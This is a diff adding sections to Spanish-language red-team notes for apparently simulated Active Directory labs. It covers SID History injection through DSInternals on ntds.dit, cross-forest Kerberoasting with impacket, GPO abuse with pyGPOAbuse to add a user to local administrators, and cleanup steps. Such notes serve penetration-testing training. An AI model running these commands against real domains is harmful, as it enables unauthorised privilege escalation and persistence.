@@ -53,6 +53,16 @@
     - [Acceso a historial PS via SMB](#acceso-a-historial-ps-via-smb)
     - [Shares SMB — prioridad de enumeración](#shares-smb--prioridad-de-enumeración)
     - [Archivos con mayor probabilidad de credenciales](#archivos-con-mayor-probabilidad-de-credenciales)
+  - [*Última actualización: Mayo 2026 — Lab-04 IRON FOREST (APT28) — Adrián Camacho*](#última-actualización-mayo-2026--lab-04-iron-forest-apt28--adrián-camacho)
+  - [17. 🌲 Multi-Forest — OPSEC y Consideraciones Técnicas](#17--multi-forest--opsec-y-consideraciones-técnicas)
+    - [Evil-WinRM — Limitaciones de token en entornos multi-domain](#evil-winrm--limitaciones-de-token-en-entornos-multi-domain)
+    - [SID History — Restricciones de protocolo AD](#sid-history--restricciones-de-protocolo-ad)
+    - [Cross-Forest Kerberoasting — TGT previo obligatorio](#cross-forest-kerberoasting--tgt-previo-obligatorio)
+  - [18. 🖥️ GPO Abuse — pyGPOAbuse vs XML manual](#18-️-gpo-abuse--pygpoabuse-vs-xml-manual)
+    - [Por qué XML manual falla en Windows 11](#por-qué-xml-manual-falla-en-windows-11)
+    - [pyGPOAbuse — herramienta correcta](#pygpoabuse--herramienta-correcta)
+    - [Cleanup completo GPO Abuse](#cleanup-completo-gpo-abuse)
+  - [19. 🔧 New-SmbShare — Windows Server en español](#19--new-smbshare--windows-server-en-español)
 
 ---
 
@@ -443,3 +453,95 @@ Get-ChildItem "C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLin
 ---
 
 *Última actualización: Mayo 2026 — Lab-04 IRON FOREST (APT28) — Adrián Camacho*
+---
+
+## 17. 🌲 Multi-Forest — OPSEC y Consideraciones Técnicas
+
+### Evil-WinRM — Limitaciones de token en entornos multi-domain
+
+Evil-WinRM usa Network Logon (Type 3). Este tipo de logon limita las operaciones que pueden hacer las herramientas AD contra otros dominios desde la sesión:
+
+- `Get-ADGroup -Server otro.dominio.local` falla con `ADServerDownException` aunque el DC sea accesible
+- El token de red no puede autenticarse contra ADWS (puerto 9389) de otro dominio
+- **Workaround:** Usar `.NET System.Security.Principal.NTAccount` para resolver SIDs via LDAP:
+  ```powershell
+  ([System.Security.Principal.NTAccount]"ATACKCORP\Admins. del dominio").Translate(
+      [System.Security.Principal.SecurityIdentifier]).Value
+  ```
+
+### SID History — Restricciones de protocolo AD
+
+El atributo `sIDHistory` está protegido contra modificación via LDAP incluso siendo DA:
+- `bloodyAD` no puede modificarlo (limitación de protocolo, no de herramienta)
+- `dacledit` no puede modificarlo
+- Solo modificable via acceso directo al ntds.dit (DSInternals) o via DS-Replication
+
+Siempre usar **DSInternals `Add-ADDBSidHistory`** — requiere parar NTDS (~30s de interrupción):
+```powershell
+Stop-Service NTDS -Force
+Import-Module DSInternals.psd1
+Add-ADDBSidHistory -SamAccountName user -SidHistory 'SID' -DBPath 'C:\Windows\NTDS\ntds.dit' -Force
+Start-Service NTDS
+```
+
+### Cross-Forest Kerberoasting — TGT previo obligatorio
+
+```bash
+impacket-getTGT dominio/user:pass -dc-ip IP
+export KRB5CCNAME=user.ccache
+impacket-GetUserSPNs dominio/user:pass -target-domain corp.local -dc-ip DC-02-IP -request
+```
+
+Sin TGT exportado, impacket no puede generar el inter-realm referral ticket.
+
+---
+
+## 18. 🖥️ GPO Abuse — pyGPOAbuse vs XML manual
+
+### Por qué XML manual falla en Windows 11
+
+`ImmediateTaskV2` y `Groups.xml` GPP no son procesados por Windows 11 moderno. La extensión cliente GPP puede estar deshabilitada. Además, si `GPT.INI Version=0` el cliente no reprocesa el GPO aunque el contenido haya cambiado.
+
+### pyGPOAbuse — herramienta correcta
+
+pyGPOAbuse incrementa automáticamente el GPT.INI Version counter y usa un mecanismo diferente al GPP que sí funciona en Windows 11:
+
+```bash
+python3 /opt/redteam/pyGPOAbuse/pygpoabuse.py 'dom/user:pass' \
+    -gpo-id 'GUID-DEL-GPO' \
+    -command 'net localgroup Administradores DOMAIN\user /add' \
+    -dc-ip IP \
+    -f
+```
+
+### Cleanup completo GPO Abuse
+
+```bash
+# 1. Eliminar ScheduledTask
+python3 pygpoabuse.py 'dom/user:pass' -gpo-id GUID -dc-ip IP -taskname TASK_xxxxxxxx --cleanup
+
+# 2. Verificar directorio vacío
+smbclient //IP/SYSVOL -U 'dom\user%pass' -c "ls dom/Policies/{GUID}/Machine/Preferences/ScheduledTasks/"
+
+# 3. Restaurar DACL desde backup
+impacket-dacledit -action restore -target-dn 'CN={GUID},CN=Policies,...' \
+    -file loot/dacledit-backup.bak dom/user:pass -dc-ip IP
+```
+
+---
+
+## 19. 🔧 New-SmbShare — Windows Server en español
+
+`-ReadAccess "Everyone"` y `-FullAccess "ATACKCORP\Admins. del dominio"` fallan en Windows Server en español:
+
+```powershell
+# Usar SID directos en lugar de nombres de grupo
+New-SmbShare -Name "ShareName" -Path "C:\Path" -ReadAccess "*S-1-1-0"              # Everyone
+New-SmbShare -Name "ShareName" -Path "C:\Path" -FullAccess "*S-1-5-21-XXX-XXX-XXX-512"  # Domain Admins SID
+```
+
+En entornos multi-forest con trust degradado, el nombre de grupo también puede fallar. Siempre usar SID.
+
+---
+
+*Última actualización: Junio 2026 — Lab-06 BLACK POLICY (APT28)*
